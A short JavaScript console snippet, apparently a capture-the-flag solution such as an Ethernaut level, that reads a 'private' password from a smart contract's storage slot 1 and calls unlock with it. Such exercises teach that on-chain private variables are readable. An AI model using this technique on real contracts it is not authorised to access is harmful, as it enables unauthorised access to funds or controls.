// run in console
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
